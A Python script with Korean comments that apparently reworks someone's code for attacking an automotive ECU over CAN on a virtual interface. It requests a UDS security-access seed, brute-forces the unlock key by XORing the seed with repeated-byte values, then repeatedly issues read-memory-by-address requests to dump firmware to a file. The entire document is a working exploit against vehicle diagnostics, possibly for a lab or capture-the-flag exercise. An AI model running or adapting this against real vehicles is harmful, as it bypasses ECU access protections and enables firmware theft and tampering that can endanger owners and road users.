import sys
import threading
import can
import time

# --- [CONFIGURATIONS] ---
CAN_INTERFACE = 'socketcan'
CAN_CHANNEL = 'vcan0'
CAN_BITRATE = 500000
REQ_ID = 0x7DF
RES_ID = 0x7E8

def setup_can_bus():
    try:
        bus = can.interface.Bus(interface=CAN_INTERFACE, channel=CAN_CHANNEL, bitrate=CAN_BITRATE)
        print(f"[INFO] Bus initialized on {CAN_CHANNEL}")
        return bus
    except Exception as e:
        print(f"[ERROR] Bus setup failed: {e}"); return None

def send_can_message(bus, msg_id, payload_str):
    try:
        data_bytes = [int(byte, 16) for byte in payload_str.split()]
        msg = can.Message(arbitration_id=msg_id, data=data_bytes, is_extended_id=False)
        bus.send(msg)
    except Exception as e:
        print(f"[ERROR] Send failed: {e}")

def receive_response_return_byte(bus, target_id, timeout_ms):
    timeout_sec = timeout_ms / 1000.0
    start_time = time.time()
    full_data = bytearray()
    expected_len = 0

    while (time.time() - start_time) < timeout_sec:
        msg = bus.recv(timeout=0.05)
        if msg is not None and msg.arbitration_id == target_id:
            pci_type = msg.data[0] >> 4
            if msg.data[1] == 0x7F: return b"ERROR"

            if pci_type == 0x00: # Single Frame
                return bytes(msg.data) # 인덱스 유지를 위해 8바이트 전체 반환
            elif pci_type == 0x01: # First Frame
                expected_len = ((msg.data[0] & 0x0F) << 8) | msg.data[1]
                full_data.extend(msg.data[2:])
                bus.send(can.Message(arbitration_id=REQ_ID, data=[0x30, 0x00, 0x00, 0, 0, 0, 0, 0], is_extended_id=False))
            elif pci_type == 0x02: # Consecutive Frame
                full_data.extend(msg.data[1:])
                if len(full_data) >= expected_len:
                    # 기존 코드의 인덱스 규칙([3:] 등)을 위해 앞에 3바이트 더미 추가
                    return bytes([0x00, 0x00, 0x00]) + bytes(full_data[:expected_len])
    return None

def singleByteTransform(source, byteLen):
    ret = 0
    for i in range(byteLen):
        ret = (ret << 8) | source
    return ret

if __name__ == "__main__":
    bus = setup_can_bus()
    if not bus: exit()

    # 1. Seed 요청 (질문자님 원본 로직)
    print("[*] Requesting Seed...")
    send_can_message(bus, REQ_ID, "02 27 01 00 00 00 00 00")
    res_01 = receive_response_return_byte(bus, RES_ID, 200)
    
    seed_byte = None
    if res_01:
        if res_01[1] == 0x67: # Single Frame
            seed_byte = res_01[3:7]
        elif res_01[0] == 0x00 and res_01[3] == 0x67: # Multi Frame (더미 포함)
            seed_byte = res_01[5:9]
    
    if not seed_byte:
        print("[-] Failed to get seed"); exit()
    print(f"[+] Seed found: {seed_byte.hex().upper()}")

    # 2. Key Unlock (질문자님 원본 브루트포스 로직)
    sa1_flag = 0
    print("[*] Unlocking Security Access...")
    for i in range(0x00, 0x100):
        cipher = singleByteTransform(i, 4)
        seed_int = int.from_bytes(seed_byte, byteorder='big')
        xor_ret_int = seed_int ^ cipher
        xor_ret_byte = xor_ret_int.to_bytes(4, byteorder='big')
        xor_ret_hex = xor_ret_byte.hex(' ').upper()

        send_can_message(bus, REQ_ID, f'07 27 02 {xor_ret_hex} 00')
        saRet = receive_response_return_byte(bus, RES_ID, 200)

        if saRet:
            # 긍정 응답(0x67) 확인
            if (saRet[1] == 0x67) or (saRet[0] == 0x00 and saRet[3] == 0x67):
                print(f"[!] Unlock Success with Key index: {hex(i)}")
                sa1_flag = 1
                break
    
    if sa1_flag == 0:
        print("[-] Unlock failed"); exit()

    # 3. Automatic RMBA Loop (ELF 데이터 수집 최적화)
    current_addr = 0x00400000
    dumped_data = b""
    chunk_size = 0xFF 

    print(f"[*] Starting Automatic Dump from {hex(current_addr)}...")
    
    try:
        while True:
            addr_bytes = current_addr.to_bytes(4, 'big')[-3:]
            addr_hex = addr_bytes.hex(' ').upper()
            
            # 8바이트 Single Frame 제한에 맞춤
            # PCI(07) + SID(23) + Format(23) + Addr(3) + Len(2) = 8바이트
            req_msg = f"07 23 23 {addr_hex} 00 {chunk_size:02X}"
            send_can_message(bus, REQ_ID, req_msg)

            res_rmba = receive_response_return_byte(bus, RES_ID, 500)

            if res_rmba is None or res_rmba == b"ERROR":
                print(f"\n[!] Stopped at {hex(current_addr)}.")
                break
            
            # 응답 데이터 정제 (0x63이 있으면 제거, 없으면 전체 취합)
            # 수신 함수에서 Multi-frame 시 앞 3바이트 더미를 붙이므로 이를 고려
            temp_data = res_rmba
            if temp_data[0] == 0x00: # Multi-frame dummy 처리
                actual_payload = temp_data[3:]
            else: # Single-frame
                actual_payload = temp_data[1:]

            # 만약 페이로드 첫 바이트가 0x63(긍정응답)이라면 데이터만 추출
            if len(actual_payload) > 0 and actual_payload[0] == 0x63:
                actual_payload = actual_payload[1:]

            dumped_data += actual_payload
            print(f"\r[DUMP] Address: {hex(current_addr)} | Total: {len(dumped_data)} bytes", end="")
            
            current_addr += len(actual_payload)
            time.sleep(0.001)

    except KeyboardInterrupt:
        print("\n[!] User Interrupted.")

    if dumped_data:
        with open("firmware.bin", "wb") as f:
            f.write(dumped_data)
        print(f"\n[SUCCESS] {len(dumped_data)} bytes saved to firmware.bin")